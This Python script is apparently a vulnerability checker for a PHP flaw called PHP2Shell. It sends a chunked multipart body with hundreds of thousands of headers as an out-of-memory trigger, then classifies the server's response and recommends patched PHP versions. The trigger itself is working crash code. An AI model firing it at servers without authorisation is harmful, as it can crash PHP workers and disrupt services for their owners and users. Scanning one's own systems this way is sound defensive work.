#!/usr/bin/env python3
"""
PHP2Shell vulnerability checker (CVE-2026-109618 / CVE-2026-109619).

Sends the publicly-documented Stage-1 OOM trigger (a multipart header-bomb
via HTTP chunked transfer encoding) and checks the response to determine
whether the target PHP server is vulnerable.

This is a detection-only tool — no exploitation, no data exfiltration.

Usage:
  python3 check_vuln.py https://example.com/index.php
  python3 check_vuln.py https://example.com/wp-login.php --timeout 15
"""
from __future__ import annotations

import argparse
import http.client
import ssl
import sys
import urllib.parse

CRLF = b"\r\n"
BOUNDARY = "php2shellCHECKsep"


def build_payload(parts: int = 1, headers: int = 300_000) -> bytes:
    """Build a multipart body with many headers per part (the OOM amplifier)."""
    bb = f"--{BOUNDARY}".encode()
    out = bytearray()
    for p in range(parts):
        out += bb + CRLF
        out += f'Content-Disposition: form-data; name="f{p}"; filename=""'.encode() + CRLF
        out += b"Content-Type: application/octet-stream" + CRLF
        for h in range(headers):
            out += b"X-P%d: x" % h + CRLF
        out += CRLF + CRLF
    out += f"--{BOUNDARY}--".encode() + CRLF
    return bytes(out)


def chunked_body(data: bytes, chunk_size: int = 65536) -> bytes:
    """Wrap raw bytes in HTTP chunked transfer encoding."""
    out = bytearray()
    for i in range(0, len(data), chunk_size):
        chunk = data[i : i + chunk_size]
        out += f"{len(chunk):x}\r\n".encode()
        out += chunk + b"\r\n"
    out += b"0\r\n\r\n"
    return bytes(out)


def check(url: str, timeout: float = 10.0, parts: int = 1,
          headers: int = 300_000) -> dict:
    """Send the OOM trigger and interpret the response."""
    u = urllib.parse.urlsplit(url)
    is_https = u.scheme == "https"
    host = u.hostname
    port = u.port or (443 if is_https else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    payload = build_payload(parts, headers)
    body = chunked_body(payload)
    wire_mb = len(payload) / 1048576

    if is_https:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)

    conn.putrequest("POST", path)
    conn.putheader("Host", host)
    conn.putheader("Content-Type", f"multipart/form-data; boundary={BOUNDARY}")
    conn.putheader("Transfer-Encoding", "chunked")
    conn.putheader("Connection", "close")
    conn.endheaders()
    conn.send(body)

    resp = conn.getresponse()
    status = resp.status
    resp_body = resp.read(4096).decode("latin1", errors="replace")
    conn.close()

    result = {
        "url": url,
        "status": status,
        "wire_mb": wire_mb,
        "parts": parts,
        "headers": headers,
    }

    if status == 500:
        if "memory" in resp_body.lower() or "Unknown on line 0" in resp_body:
            result["verdict"] = "LIKELY VULNERABLE"
            result["detail"] = "HTTP 500 + OOM signature — unpatched PHP (mod_php)"
        else:
            result["verdict"] = "POSSIBLY VULNERABLE"
            result["detail"] = "HTTP 500 but no OOM signature in body (display_errors may be Off)"
    elif status == 502:
        result["verdict"] = "POSSIBLY VULNERABLE (FPM)"
        result["detail"] = "HTTP 502 — PHP-FPM child may have crashed (OOM fatal + exit)"
    elif status == 200:
        result["verdict"] = "NOT VULNERABLE (or mitigated)"
        result["detail"] = "HTTP 200 — patched, or a reverse proxy rewrote chunked TE"
    elif status == 413:
        result["verdict"] = "MITIGATED"
        result["detail"] = "HTTP 413 — reverse proxy or WAF rejected the body size"
    elif status == 403:
        result["verdict"] = "BLOCKED"
        result["detail"] = "HTTP 403 — WAF or access control blocked the request"
    else:
        result["verdict"] = "INCONCLUSIVE"
        result["detail"] = f"HTTP {status} — unexpected response"

    return result


def main() -> int:
    ap = argparse.ArgumentParser(
        description="PHP2Shell vulnerability checker — detection only, no exploit",
    )
    ap.add_argument("url", help="target URL, e.g. https://example.com/index.php")
    ap.add_argument("--timeout", type=float, default=10.0,
                    help="HTTP timeout in seconds (default: 10)")
    ap.add_argument("--parts", type=int, default=1,
                    help="multipart parts in the payload (default: 1)")
    ap.add_argument("--headers", type=int, default=300_000,
                    help="header lines per part (default: 300000, ~3.9 MiB on wire)")
    args = ap.parse_args()

    print(f"[*] target: {args.url}")
    print(f"[*] payload: {args.parts} part(s), {args.headers:,} headers/part")

    try:
        r = check(args.url, args.timeout, args.parts, args.headers)
    except Exception as e:
        print(f"[!] error: {e}", file=sys.stderr)
        return 1

    print(f"[*] wire size: {r['wire_mb']:.1f} MiB")
    print(f"[*] HTTP {r['status']}")
    print()

    tag = "+" if "VULNERABLE" in r["verdict"] else "-"
    print(f"[{tag}] {r['verdict']}")
    print(f"    {r['detail']}")
    print()

    if "VULNERABLE" in r["verdict"]:
        print("    Recommendation: upgrade to PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+")
        print("    References:")
        print("      CVE-2026-109618 — https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w")
        print("      CVE-2026-109619 — https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp")

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
